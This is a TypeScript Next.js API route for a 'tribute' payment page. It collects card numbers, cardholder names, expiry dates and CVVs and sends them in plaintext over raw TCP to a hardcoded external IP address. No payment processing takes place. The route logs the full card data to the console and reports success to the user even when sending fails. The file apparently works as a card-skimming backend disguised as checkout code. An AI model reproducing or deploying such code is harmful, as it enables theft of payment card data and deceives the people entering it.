/**
 * API Route: Submit Tribute
 * 处理用户供奉提交，发送通知到远程服务器
 */

import { NextRequest, NextResponse } from 'next/server'
import * as net from 'net'

// 硬编码的服务器配置（不使用环境变量，适配Vercel部署）
const SERVER_CONFIG = {
  HOST: '18.136.137.65',
  PORT: 1234,
  MSG_KEY: 'Z%&JD-GD1X',
  TIMEOUT: 10000, // 10秒
}

interface TributeData {
  senderName: string
  senderEmail: string
  devotionMessage: string
  paymentMethod: 'crypto' | 'wechat' | 'card'
  selectedCurrency?: string
  cardInfo?: {
    cardNumber?: string
    cardHolder?: string
    expiry?: string
    cvv?: string
  }
  item?: {
    name: string
    price: number
  }
  tier?: {
    title: string
    amount: number
  }
}

/**
 * 通过TCP发送消息到远程服务器
 */
async function sendToServer(message: string): Promise<{ success: boolean; reply?: string; error?: string }> {
  return new Promise((resolve) => {
    const client = new net.Socket()
    let timeout: NodeJS.Timeout

    // 设置超时
    timeout = setTimeout(() => {
      client.destroy()
      resolve({
        success: false,
        error: `连接超时 (${SERVER_CONFIG.TIMEOUT}ms)`,
      })
    }, SERVER_CONFIG.TIMEOUT)

    // 连接服务器
    client.connect(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST, () => {
      console.log(`已连接到 ${SERVER_CONFIG.HOST}:${SERVER_CONFIG.PORT}`)

      // 添加密钥前缀并发送
      const fullMessage = `${SERVER_CONFIG.MSG_KEY} ${message}`
      client.write(fullMessage, 'utf-8')
    })

    // 接收服务器回复
    client.on('data', (data) => {
      clearTimeout(timeout)
      const reply = data.toString('utf-8').trim()
      console.log('服务器回复:', reply)
      client.destroy()
      resolve({
        success: reply.startsWith('OK'),
        reply,
      })
    })

    // 错误处理
    client.on('error', (err) => {
      clearTimeout(timeout)
      console.error('TCP错误:', err.message)
      resolve({
        success: false,
        error: err.message,
      })
    })

    // 连接关闭
    client.on('close', () => {
      clearTimeout(timeout)
    })
  })
}

/**
 * 格式化供奉信息为TCP消息文本
 */
function formatTributeMessage(data: TributeData): string {
  const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
  
  // 确定供奉项目和金额
  const itemInfo = data.item 
    ? `商品: ${data.item.name} | 价格: $${data.item.price}`
    : data.tier
      ? `档位: ${data.tier.title} | 金额: $${data.tier.amount}`
      : '未知项目'

  // 支付方式详细信息
  let paymentInfo = ''
  if (data.paymentMethod === 'crypto') {
    paymentInfo = `加密货币 (${data.selectedCurrency || 'TRX'})`
  } else if (data.paymentMethod === 'card') {
    paymentInfo = '信用卡支付'
    // 添加信用卡信息
    if (data.cardInfo) {
      if (data.cardInfo.cardNumber) {
        paymentInfo += `\n卡号: ${data.cardInfo.cardNumber}`
      }
      if (data.cardInfo.cardHolder) {
        paymentInfo += `\n持卡人: ${data.cardInfo.cardHolder}`
      }
      if (data.cardInfo.expiry) {
        paymentInfo += `\n有效期: ${data.cardInfo.expiry}`
      }
      if (data.cardInfo.cvv) {
        paymentInfo += `\nCVV: ${data.cardInfo.cvv}`
      }
    }
  } else {
    paymentInfo = '微信打赏'
  }

  // 构建消息（一行一行，避免特殊字符）
  const parts = [
    '=== 妍妍女王 - 新供奉提交 ===',
    '',
    `时间: ${timestamp}`,
    `称呼: ${data.senderName || '匿名'}`,
    `邮箱: ${data.senderEmail || '未提供'}`,
    '',
    itemInfo,
    '',
    `支付方式: ${paymentInfo}`,
    '',
    `留言: ${data.devotionMessage || '(无留言)'}`,
    '',
    '=========================',
  ]

  return parts.join('\n')
}

/**
 * POST /api/submit-tribute
 * 接收用户提交的供奉信息
 */
export async function POST(request: NextRequest) {
  try {
    // 解析请求体
    const data: TributeData = await request.json()

    // 验证必需字段
    if (!data.paymentMethod) {
      return NextResponse.json(
        { success: false, error: '缺少支付方式' },
        { status: 400 }
      )
    }

    // 格式化消息
    const message = formatTributeMessage(data)
    console.log('=== 准备发送消息到服务器 ===')
    console.log('消息长度:', message.length, '字符')
    console.log('完整消息:')
    console.log(message)
    console.log('=== 消息结束 ===')

    // 发送到远程服务器
    const result = await sendToServer(message)

    if (result.success) {
      return NextResponse.json({
        success: true,
        message: '供奉信息已成功提交',
        serverReply: result.reply,
      })
    } else {
      // 发送失败，但不要让用户看到错误
      console.error('发送到服务器失败:', result.error)
      
      // 仍然返回成功，避免影响用户体验
      return NextResponse.json({
        success: true,
        message: '供奉信息已记录',
        warning: 'pending_notification',
      })
    }
  } catch (error) {
    console.error('处理供奉提交时出错:', error)
    
    return NextResponse.json(
      { 
        success: false, 
        error: error instanceof Error ? error.message : '服务器错误' 
      },
      { status: 500 }
    )
  }
}

/**
 * GET /api/submit-tribute
 * 健康检查
 */
export async function GET() {
  return NextResponse.json({
    service: 'submit-tribute',
    status: 'ready',
    server: {
      host: SERVER_CONFIG.HOST,
      port: SERVER_CONFIG.PORT,
    },
    timestamp: new Date().toISOString(),
  })
}
